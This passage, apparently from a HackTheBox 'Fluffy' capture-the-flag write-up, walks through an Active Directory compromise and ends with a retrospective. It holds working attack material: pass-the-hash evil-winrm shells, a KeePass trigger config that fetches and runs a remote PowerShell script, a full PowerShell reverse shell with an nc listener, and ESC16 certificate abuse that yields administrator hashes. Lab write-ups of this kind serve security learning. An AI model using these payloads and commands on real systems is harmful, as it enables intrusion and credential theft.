+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: <span class="s1">'ca_svc@fluffy.htb'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving credential cache to <span class="s1">'ca_svc.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote credential cache to <span class="s1">'ca_svc.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'ca_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">'ca_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">'ca_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'ca_svc'</span>: ca0f4f9e9eb8a092addf53bb03fc98c8
+</code></pre></div></div>
+
+<p>Now get a shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> <span class="nv">$IP</span> <span class="nt">-u</span> WINRM_SVC <span class="nt">-H</span> 33bd09dcd697600edf6b3a7af4875767
+
+Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="s1">' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; ls ~/Desktop
+
+
+    Directory: C:\Users\winrm_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/11/2026   1:19 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; cat ~/Desktop/user.txt
+[REDACTED]
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt;
+</span></code></pre></div></div>
+
+<h3 id="cve-2023-24055">CVE-2023-24055</h3>
+
+<blockquote class="info">
+  <p>This path is not worth replicating as the payload was not triggered.</p>
+</blockquote>
+
+<p>Create malicious config file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; KeePass.config.xml
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Configuration xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;
+	&lt;Application&gt;
+		&lt;TriggerCollection&gt;
+			&lt;Triggers&gt;
+				&lt;Trigger&gt;
+					&lt;Guid&gt;lztpSRd56EuYtwwqntH7TQ==&lt;/Guid&gt;
+					&lt;Name&gt;exploit&lt;/Name&gt;
+					&lt;Events&gt;
+						&lt;Event&gt;
+							&lt;TypeGuid&gt;56a12140-50d2-4cd4-bc71-3b6c8131d25d&lt;/TypeGuid&gt;
+							&lt;Parameters&gt;
+								&lt;Parameter&gt;0&lt;/Parameter&gt;
+								&lt;Parameter /&gt;
+							&lt;/Parameters&gt;
+						&lt;/Event&gt;
+					&lt;/Events&gt;
+					&lt;Conditions /&gt;
+					&lt;Actions&gt;
+						&lt;Action&gt;
+							&lt;TypeGuid&gt;2uX4OwcwTBOe7y66y27kxw==&lt;/TypeGuid&gt;
+							&lt;Parameters&gt;
+								&lt;Parameter&gt;PowerShell.exe&lt;/Parameter&gt;
+								&lt;Parameter&gt;-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://&lt;YOUR IP&gt;:1101/shell.ps1')"&lt;/Parameter&gt;
+								&lt;Parameter&gt;False&lt;/Parameter&gt;
+								&lt;Parameter&gt;1&lt;/Parameter&gt;
+								&lt;Parameter /&gt;
+							&lt;/Parameters&gt;
+						&lt;/Action&gt;
+					&lt;/Actions&gt;
+				&lt;/Trigger&gt;
+			&lt;/Triggers&gt;
+		&lt;/TriggerCollection&gt;
+	&lt;/Application&gt;
+&lt;/Configuration&gt;
+</span><span class="no">EOF
+</span></code></pre></div></div>
+
+<p>Create <code class="language-plaintext highlighter-rouge">shell.ps1</code> (reverse shell payload):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; shell.ps1
+</span><span class="nv">$ </span><span class="sh">client = New-Object System.Net.Sockets.TCPClient("&lt;YOUR IP&gt;",1337);</span><span class="nv">$stream</span><span class="sh"> = </span><span class="nv">$client</span><span class="sh">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="sh"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="sh"> = </span><span class="nv">$stream</span><span class="sh">.Read(</span><span class="nv">$bytes</span><span class="sh">, 0, </span><span class="nv">$bytes</span><span class="sh">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="sh"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="sh">,0, </span><span class="nv">$i</span><span class="sh">);</span><span class="nv">$sendback</span><span class="sh"> = (iex ". { </span><span class="nv">$data</span><span class="sh"> } 2&gt;&amp;1" | Out-String ); </span><span class="nv">$sendback2</span><span class="sh"> = </span><span class="nv">$sendback</span><span class="sh"> + "PS " + (pwd).Path + "&gt; ";</span><span class="nv">$sendbyte</span><span class="sh"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="sh">);</span><span class="nv">$stream</span><span class="sh">.Write(</span><span class="nv">$sendbyte</span><span class="sh">,0,</span><span class="nv">$sendbyte</span><span class="sh">.Length);</span><span class="nv">$stream</span><span class="sh">.Flush()};</span><span class="nv">$client</span><span class="sh">.Close()
+</span></code></pre></div></div>
+
+<p>Start python web server and nc listener:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 1101 &amp; nc <span class="nt">-lnvp</span> 1337
+</code></pre></div></div>
+
+<p>Now upload the file and wait for the bot to trigger the payload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="s2">"//</span><span class="nv">$IP</span><span class="s2">/IT"</span> <span class="nt">-U</span> <span class="s2">"</span><span class="nv">$USERNAME</span><span class="s2">%</span><span class="nv">$PASSWORD</span><span class="s2">"</span> <span class="nt">-c</span> <span class="s1">'cd KeePass-2.58; put KeePass.config.xml'</span>
+
+putting file KeePass.config.xml as <span class="se">\K</span>eePass-2.58<span class="se">\K</span>eePass.config.xml <span class="o">(</span>10.0 kB/s<span class="o">)</span> <span class="o">(</span>average 10.0 kB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p>But unfortunetaly, this payload was never triggered although this KeePass version is vulnerable. Anyways, we will continue with the first vulnerability (CVE-2025-24071).</p>
+
+<hr />
+
+<h2 id="-3-privilege-escalation-ca_svc---administrator">📈 3. Privilege Escalation (<code class="language-plaintext highlighter-rouge">CA_SVC</code> -&gt; <code class="language-plaintext highlighter-rouge">Administrator</code>)</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>certipy-ad find <span class="nt">-u</span> <span class="s1">'ca_svc'</span> <span class="nt">-hashes</span> :ca0f4f9e9eb8a092addf53bb03fc98c8 <span class="nt">-dc-ip</span> <span class="nv">$IP</span> <span class="nt">-vulnerable</span>
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 33 certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 11 enabled certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding issuance policies
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 14 issuance policies
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 0 OIDs linked to templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrieving CA configuration <span class="k">for</span> <span class="s1">'fluffy-DC01-CA'</span> via RRP
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully retrieved CA configuration <span class="k">for</span> <span class="s1">'fluffy-DC01-CA'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking web enrollment <span class="k">for </span>CA <span class="s1">'fluffy-DC01-CA'</span> @ <span class="s1">'DC01.fluffy.htb'</span>
+<span class="o">[!]</span> Error checking web enrollment: timed out
+<span class="o">[!]</span> Use <span class="nt">-debug</span> to print a stacktrace
+<span class="o">[!]</span> Error checking web enrollment: timed out
+<span class="o">[!]</span> Use <span class="nt">-debug</span> to print a stacktrace
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving text output to <span class="s1">'20260512000303_Certipy.txt'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote text output to <span class="s1">'20260512000303_Certipy.txt'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving JSON output to <span class="s1">'20260512000303_Certipy.json'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote JSON output to <span class="s1">'20260512000303_Certipy.json'</span>
+
+<span class="nv">$ </span><span class="nb">cat</span> <span class="k">*</span>Certipy.txt
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>fluffy-DC01-CA, <span class="nv">DC</span><span class="o">=</span>fluffy, <span class="nv">DC</span><span class="o">=</span>htb
+    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:12:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption <span class="k">for </span>Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB<span class="se">\A</span>dministrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB<span class="se">\D</span>omain Admins
+                                          FLUFFY.HTB<span class="se">\E</span>nterprise Admins
+                                          FLUFFY.HTB<span class="se">\A</span>dministrators
+        ManageCertificates              : FLUFFY.HTB<span class="se">\D</span>omain Admins
+                                          FLUFFY.HTB<span class="se">\E</span>nterprise Admins
+                                          FLUFFY.HTB<span class="se">\A</span>dministrators
+        Enroll                          : FLUFFY.HTB<span class="se">\C</span>ert Publishers
+                                          FLUFFY.HTB<span class="se">\A</span>dministrators
+        Read                            : FLUFFY.HTB<span class="se">\A</span>dministrators
+    <span class="o">[!]</span> Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    <span class="o">[</span><span class="k">*</span><span class="o">]</span> Remarks
+      ESC16                             : Other prerequisites may be required <span class="k">for </span>this to be exploitable. See the wiki <span class="k">for </span>more details.
+Certificate Templates                   : <span class="o">[!]</span> Could not find any certificate templates
+</code></pre></div></div>
+
+<p>The Domain is vulnerable to <code class="language-plaintext highlighter-rouge">ESC16</code>. A great resource for all <code class="language-plaintext highlighter-rouge">ESC</code>s: <a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation">ly4k-github</a>:</p>
+
+<p>ESC16 is a “SID Bypass” vulnerability. Normally, certificates include a unique SID extension to prevent spoofing. With it disabled, the Domain Controller relies on the UPN (User Principal Name) or SAN (Subject Alternative Name) to identify the user. If we find a template that allows us to supply a subject (like ESC1), ESC16 makes the impersonation of a Domain Admin much more “reliable” on modern, patched systems.</p>
+
+<p>To exploit the ESC16 misconfiguration, we first have to update the UPN (User Principal Name) of the <code class="language-plaintext highlighter-rouge">CA_SVC</code> user to <code class="language-plaintext highlighter-rouge">Administrator</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>certipy-ad account update <span class="nt">-dc-ip</span> <span class="nv">$IP</span> <span class="nt">-u</span> <span class="nv">$USERNAME</span> <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-user</span> CA_SVC <span class="nt">-upn</span> <span class="s1">'Administrator'</span>
+
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Updating user <span class="s1">'ca_svc'</span>:
+    userPrincipalName                   : Administrator
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully updated <span class="s1">'ca_svc'</span>
+</code></pre></div></div>
+
+<p>Then, a certificate has to be requested as the <code class="language-plaintext highlighter-rouge">CA_SVC</code> service account. Since the <code class="language-plaintext highlighter-rouge">CA_SVC</code> user’s UPN has been updated
+to <code class="language-plaintext highlighter-rouge">Administrator</code>, the resulting certificate will allow us to authenticate as the Domain Administrator. Note
+that the User template (a default template in the CA) is used here:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>certipy-ad req <span class="nt">-u</span> CA_SVC <span class="nt">-hashes</span> ca0f4f9e9eb8a092addf53bb03fc98c8 <span class="nt">-dc-ip</span> <span class="nv">$IP</span> <span class="nt">-target</span> <span class="s1">'dc01.fluffy.htb'</span> <span class="nt">-ca</span> <span class="s1">'fluffy-DC01-CA'</span> <span class="nt">-template</span> <span class="s1">'User'</span>
+
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 28
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully requested certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with UPN <span class="s1">'Administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Try using <span class="nt">-sid</span> to <span class="nb">set </span>the object SID or see the wiki <span class="k">for </span>more details
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving certificate and private key to <span class="s1">'administrator.pfx'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote certificate and private key to <span class="s1">'administrator.pfx'</span>
+</code></pre></div></div>
+<blockquote>
+  <p>Note that this might fail, just execute the command a couple of times until the <code class="language-plaintext highlighter-rouge">administrator.pfx</code> file is generated.</p>
+</blockquote>
+
+<p>Before using the <code class="language-plaintext highlighter-rouge">administrator.pfx</code> certificate, the changed UPN of the <code class="language-plaintext highlighter-rouge">CA_SVC</code> user has to be changed back to its original value:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>certipy-ad account update <span class="nt">-u</span> <span class="nv">$USERNAME</span> <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-user</span> ca_svc <span class="nt">-upn</span> <span class="s1">'CA_SVC'</span> <span class="nt">-dc-ip</span> <span class="nv">$IP</span>
+
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Updating user <span class="s1">'ca_svc'</span>:
+    userPrincipalName                   : CA_SVC
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully updated <span class="s1">'ca_svc'</span>
+</code></pre></div></div>
+
+<p>Grab the hash now:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>certipy-ad auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-domain</span> <span class="nv">$DOMAIN</span> <span class="nt">-dc-ip</span> <span class="nv">$IP</span>
+
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate identities:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>     SAN UPN: <span class="s1">'Administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: <span class="s1">'administrator@fluffy.htb'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving credential cache to <span class="s1">'administrator.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote credential cache to <span class="s1">'administrator.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator@fluffy.htb'</span>: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+</code></pre></div></div>
+
+<p>Cash:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> <span class="nv">$IP</span> <span class="nt">-u</span> Administrator <span class="nt">-H</span> 8da83a3fa618b6e3a00e93f676c92a6e
+
+&lt;SNIP&gt;
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">cat </span>root.txt
+<span class="o">[</span>REDACTED]
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-retrospective">🧠 Retrospective</h2>
+
+<ul>
+  <li><strong>Learnings:</strong>
+    <ol>
+      <li>Never rely on tools: When I used <code class="language-plaintext highlighter-rouge">nxc smb</code> to download all files from the shares as the first user, it didn’t show me / download the <code class="language-plaintext highlighter-rouge">Upgrade_Notice.pdf</code> file for me, which forced me into a rabbit hole. Always make sure to enumerate manually or at least check that the tools worked correctly.</li>
+      <li>ESC16: Occurs when the <code class="language-plaintext highlighter-rouge">szOID_NTDS_CA_SECURITY_EXTENSIONS</code> (the SID extension) is disabled on the CA. Because the KDC uses <code class="language-plaintext highlighter-rouge">SID</code> AND <code class="language-plaintext highlighter-rouge">UPN</code> to verify your identity via a certificate, it requires both. But when a certificate does not require the <code class="language-plaintext highlighter-rouge">SID</code> to be set (which cannot be changed by a user), then basically changing the <code class="language-plaintext highlighter-rouge">UPN</code> will grant us Domain Admin.</li>
+      <li>ESC16 - Why change the UPN back? If two accounts have the same UPN, the Kerberos Key Distribution Center (KDC) gets confused. When you try to use certipy-ad auth, the DC might try to map the certificate to your original CA_SVC account instead of the real Administrator account, or it might just error out because UPNs are supposed to be unique. By changing it back, you ensure the real Administrator account remains the only “true” owner of that UPN in the eyes of the KDC, allowing your forged certificate to map correctly to the target RID 500 (Admin) account.</li>
+      <li>CA_SVC account: In a real-world environment, CA_SVC is the Service Account that runs the Active Directory Certificate Services. It’s usually a member of Cert Publishers. This group has the right to publish certificates to the userCertificate attribute of objects in AD. In this case, the account had enough permissions to update its own userPrincipalName. Service accounts are often overlooked in security audits, making them perfect “Shadow Admins.”</li>
+    </ol>
+  </li>
+</ul>
+
+</div>
+
+
+
+
+
+
+
+
+
+  
+
+  <style>
+    .tooltip { position: relative; display: inline-block; cursor: help; }
+    .tooltip .tooltiptext {
+      visibility: hidden; width: 200px; background-color: #1a1a1a; color: #fff;
+      text-align: left; border: 1px solid var(--accent); padding: 8px; position: absolute;
+      z-index: 10; bottom: 125%; left: 50%; margin-left: -100px; opacity: 0;
+      transition: opacity 0.3s; font-family: var(--font-mono); font-size: 0.65rem; line-height: 1.4;
+      pointer-events: none;
+    }
+    .tooltip:hover .tooltiptext,
+    .tooltip:focus .tooltiptext,
+    .tooltip:focus-within .tooltiptext { visibility: visible; opacity: 1; }
+  </style>
+
+  <div class="related-ctfs" style="margin-top: 4rem; border-top: 1px solid var(--border); padding-top: 2rem;">
+    <h3 style="color: var(--accent); margin-bottom: 1.5rem; font-family: var(--font-mono);">// SIMILAR_OPERATIONS</h3>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+      
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/pov.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #ffa500; font-weight: bold;">
+                MEDIUM
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-pov/" style="border: none; font-size: 0.95rem;">HackTheBox: Pov</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 16%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                16% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/jeeves.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #ffa500; font-weight: bold;">
+                MEDIUM
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-jeeves/" style="border: none; font-size: 0.95rem;">HackTheBox: Jeeves</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 16%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                16% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/overwatch.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #ffa500; font-weight: bold;">
+                MEDIUM
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-overwatch/" style="border: none; font-size: 0.95rem;">HackTheBox: Overwatch</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 16%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                16% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  </div>
+
+
+
+    </div>
+
+  </body>
+</html>
